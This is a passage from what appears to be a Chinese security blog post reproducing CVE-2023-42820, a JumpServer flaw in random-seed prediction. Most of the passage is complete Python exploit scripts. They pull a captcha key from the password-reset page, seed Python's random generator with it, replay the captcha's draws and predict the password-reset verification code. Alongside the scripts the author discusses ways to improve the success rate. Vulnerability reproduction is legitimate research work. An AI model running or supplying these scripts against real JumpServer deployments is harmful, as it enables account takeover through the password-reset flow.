</span></span><span style="display:flex;"><span>    chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([args_string_map[k] <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> kwargs<span style="color:#f92672">.</span>items() <span style="color:#66d9ef">if</span> v])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> list(random<span style="color:#f92672">.</span>choice(chars) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> kwargs<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> v <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> (set(password) <span style="color:#f92672">&amp;</span> set(args_string_map[k])):
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 没有包含指定的字符, retry</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> can_startswith_special_char <span style="color:#f92672">and</span> password[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">in</span> args_string_map[<span style="color:#e6db74">&#39;special_char&#39;</span>]:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 首位不能为特殊字符, retry</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 满足要求终止 while 循环</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(password)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_seed</span>(s : requests<span style="color:#f92672">.</span>Session):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] start set seed&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/password/forget/previewing/&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\/core\/auth\/captcha\/image\/([a-f0-9]</span><span style="color:#e6db74">{40}</span><span style="color:#e6db74">)\/&#39;</span>
</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern, res<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[-] get key failed&#39;</span>)
</span></span><span style="display:flex;"><span>            print(res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>            exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">40</span> :
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[-] key error&#39;</span>)
</span></span><span style="display:flex;"><span>            exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/captcha/image/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/&#39;</span><span style="color:#f92672">.</span>format(key))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    set_seed(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    gen_img_flow(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">6</span>, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    print(code)
</span></span></code></pre></div><h2 id="提升成功概率的尝试">提升成功概率的尝试<a hidden class="anchor" aria-hidden="true" href="#提升成功概率的尝试">#</a></h2>
<p>上面的脚本有概率失败是因为，seed偏移不确定。要提升成功率要从此入手。</p>
<p>如下图：
<img alt="2" loading="lazy" src="/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/images/2.png"></p>
<p>需要获取原本seed的值或者chal</p>
<h3 id="思路一-设置两次seed不可行">思路一 设置两次seed(不可行)<a hidden class="anchor" aria-hidden="true" href="#思路一-设置两次seed不可行">#</a></h3>
<p>可以先设置seed1，再设置seed2，这样chal由seed1生成，code由seed2生成。</p>
<p>看似很合理，但其实不可行，因为如果要通过seed1计算chal，需要知道seed1的偏移，这就又变成要获取在seed1之前的那个未知chal了。</p>
<p>如图所示：
<img alt="3" loading="lazy" src="/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/images/3.png"></p>
<h3 id="思路二-chal辅助计算可行">思路二 chal辅助计算(可行)<a hidden class="anchor" aria-hidden="true" href="#思路二-chal辅助计算可行">#</a></h3>
<p>在设置seed之后，查看生成的chal，手动输入chal辅助计算。</p>
<p>如图：
<img alt="4" loading="lazy" src="/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/images/4.png"></p>
<p>虽说<code>100%</code>准确，但很麻烦，不用chal辅助正确率也能有<code>60%</code>以上了，意义不大。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> PIL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>string_punctuation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_~&#39;</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_img_flow</span>(n):
</span></span><span style="display:flex;"><span>    CAPTCHA_LETTER_ROTATION <span style="color:#f92672">=</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> (<span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">38</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randrange(<span style="color:#f92672">*</span>CAPTCHA_LETTER_ROTATION)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> range(int(size[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> size[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.1</span>)):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(length: int, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, digit<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, special_char<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    args_names <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;lower&#39;</span>, <span style="color:#e6db74">&#39;upper&#39;</span>, <span style="color:#e6db74">&#39;digit&#39;</span>, <span style="color:#e6db74">&#39;special_char&#39;</span>]
</span></span><span style="display:flex;"><span>    args_values <span style="color:#f92672">=</span> [lower, upper, digit, special_char]
</span></span><span style="display:flex;"><span>    args_string <span style="color:#f92672">=</span> [string<span style="color:#f92672">.</span>ascii_lowercase, string<span style="color:#f92672">.</span>ascii_uppercase, string<span style="color:#f92672">.</span>digits, string_punctuation]
</span></span><span style="display:flex;"><span>    args_string_map <span style="color:#f92672">=</span> dict(zip(args_names, args_string))
</span></span><span style="display:flex;"><span>    kwargs <span style="color:#f92672">=</span> dict(zip(args_names, args_values))
</span></span><span style="display:flex;"><span>    kwargs_keys <span style="color:#f92672">=</span> list(kwargs<span style="color:#f92672">.</span>keys())
</span></span><span style="display:flex;"><span>    kwargs_values <span style="color:#f92672">=</span> list(kwargs<span style="color:#f92672">.</span>values())
</span></span><span style="display:flex;"><span>    args_true_count <span style="color:#f92672">=</span> len([i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> kwargs_values <span style="color:#66d9ef">if</span> i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> any(kwargs_values), <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Parameters </span><span style="color:#e6db74">{</span>kwargs_keys<span style="color:#e6db74">}</span><span style="color:#e6db74"> must have at least one `True`&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> length <span style="color:#f92672">&gt;=</span> args_true_count, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Expected length &gt;= </span><span style="color:#e6db74">{</span>args_true_count<span style="color:#e6db74">}</span><span style="color:#e6db74">, bug got </span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    can_startswith_special_char <span style="color:#f92672">=</span> args_true_count <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> special_char
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([args_string_map[k] <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> kwargs<span style="color:#f92672">.</span>items() <span style="color:#66d9ef">if</span> v])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> list(random<span style="color:#f92672">.</span>choice(chars) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> kwargs<span style="color:#f92672">.</span>items():
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> v <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> (set(password) <span style="color:#f92672">&amp;</span> set(args_string_map[k])):
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 没有包含指定的字符, retry</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> can_startswith_special_char <span style="color:#f92672">and</span> password[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">in</span> args_string_map[<span style="color:#e6db74">&#39;special_char&#39;</span>]:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 首位不能为特殊字符, retry</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 满足要求终止 while 循环</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(password)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_seed</span>(s : requests<span style="color:#f92672">.</span>Session):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] start set seed&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/password/forget/previewing/&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\/core\/auth\/captcha\/image\/([a-f0-9]</span><span style="color:#e6db74">{40}</span><span style="color:#e6db74">)\/&#39;</span>
</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern, res<span style="color:#f92672">.</span>text)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[-] get key failed&#39;</span>)
</span></span><span style="display:flex;"><span>            print(res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>            exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(key) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">40</span> :
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;[-] key error&#39;</span>)
</span></span><span style="display:flex;"><span>            exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/core/auth/captcha/image/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/&#39;</span><span style="color:#f92672">.</span>format(key))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./out/out.png&#39;</span><span style="color:#f92672">.</span>format(str(i)), <span style="color:#e6db74">&#39;wb&#39;</span>)
</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>write(res<span style="color:#f92672">.</span>content)
</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    set_seed(s)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    img <span style="color:#f92672">=</span> PIL<span style="color:#f92672">.</span>Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;./out/out.png&#39;</span>)
</span></span><span style="display:flex;"><span>    img<span style="color:#f92672">.</span>show()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    chal <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;chal : &#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    CAPTCHA_LETTER_ROTATION <span style="color:#f92672">=</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>    charlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> chal:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">and</span> len(charlist) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            charlist[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            charlist<span style="color:#f92672">.</span>append(char)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randrange(<span style="color:#f92672">*</span>CAPTCHA_LETTER_ROTATION)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    gen_img_flow(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">6</span>, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    print(code)
</span></span></code></pre></div><h3 id="思路三-自动校准偏移不可行">思路三 自动校准偏移(不可行)<a hidden class="anchor" aria-hidden="true" href="#思路三-自动校准偏移不可行">#</a></h3>
<p>流程如下：</p>
<ol>
<li>先设置seed1</li>
<li>访问<code>/core/auth/password/forget/previewing/</code>路由刷新验证码，此时seed变为seed2，chal由seed1生成。</li>
<li>枚举由seed1生成的chal的四种可能，选择可能性最高尝试提交form。使用while 循环重复1-3步骤。如果验证码检验通过则break。</li>
<li>循环break说明seed2和chal均确定，此时可以准确计算code了。</li>
</ol>
<p>验证码通过就代表偏移设置为4的情况生成的chal是正确的。</p>
<p>流程图：
<img alt="5" loading="lazy" src="/posts/jumpserver%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B%E6%BC%8F%E6%B4%9Ecve-2023-42820%E5%A4%8D%E7%8E%B0/images/5.png"></p>
<p>此时可以看到一个问题，如果要校准seed2的偏移必须要提交form通过验证码检验，但上文中的代码审计得知，一个seed对应的chal使用过一次就不能再用了，所以重新设置seed2会失败，返回410错误：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    store <span style="color:#f92672">=</span> CaptchaStore<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(hashkey<span style="color:#f92672">=</span>key)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> CaptchaStore<span style="color:#f92672">.</span>DoesNotExist:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># HTTP 410 Gone status so that crawlers don&#39;t index these expired urls.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> HttpResponse(status<span style="color:#f92672">=</span><span style="color:#ae81ff">410</span>)
</span></span></code></pre></div><p>所以这个方法不可行。不过还是把脚本贴上来吧：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>string_punctuation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_~&#39;</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_img_flow</span>(n):
</span></span><span style="display:flex;"><span>    CAPTCHA_LETTER_ROTATION <span style="color:#f92672">=</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> (<span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">38</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randrange(<span style="color:#f92672">*</span>CAPTCHA_LETTER_ROTATION)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> range(int(size[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> size[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.1</span>)):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">math_challenge</span>():
</span></span><span style="display:flex;"><span>    operators <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>)
</span></span><span style="display:flex;"><span>    operands <span style="color:#f92672">=</span> (random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>), random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>))
</span></span><span style="display:flex;"><span>    operator <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>choice(operators)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> operands[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;</span> operands[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">==</span> operator:
</span></span><span style="display:flex;"><span>        operands <span style="color:#f92672">=</span> (operands[<span style="color:#ae81ff">1</span>], operands[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    challenge <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d%s%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (operands[<span style="color:#ae81ff">0</span>], operator, operands[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">=&#34;</span><span style="color:#f92672">.</span>format(challenge<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>)),
</span></span><span style="display:flex;"><span>        str(eval(challenge)),
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(length: int, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, digit<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, special_char<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    args_names <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;lower&#39;</span>, <span style="color:#e6db74">&#39;upper&#39;</span>, <span style="color:#e6db74">&#39;digit&#39;</span>, <span style="color:#e6db74">&#39;special_char&#39;</span>]
</span></span><span style="display:flex;"><span>    args_values <span style="color:#f92672">=</span> [lower, upper, digit, special_char]
</span></span><span style="display:flex;"><span>    args_string <span style="color:#f92672">=</span> [string<span style="color:#f92672">.</span>ascii_lowercase, string<span style="color:#f92672">.</span>ascii_uppercase, string<span style="color:#f92672">.</span>digits, string_punctuation]
</span></span><span style="display:flex;"><span>    args_string_map <span style="color:#f92672">=</span> dict(zip(args_names, args_string))
</span></span><span style="display:flex;"><span>    kwargs <span style="color:#f92672">=</span> dict(zip(args_names, args_values))
</span></span><span style="display:flex;"><span>    kwargs_keys <span style="color:#f92672">=</span> list(kwargs<span style="color:#f92672">.</span>keys())
</span></span><span style="display:flex;"><span>    kwargs_values <span style="color:#f92672">=</span> list(kwargs<span style="color:#f92672">.</span>values())
</span></span><span style="display:flex;"><span>    args_true_count <span style="color:#f92672">=</span> len([i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> kwargs_values <span style="color:#66d9ef">if</span> i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> any(kwargs_values), <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Parameters </span><span style="color:#e6db74">{</span>kwargs_keys<span style="color:#e6db74">}</span><span style="color:#e6db74"> must have at least one `True`&#39;</span>
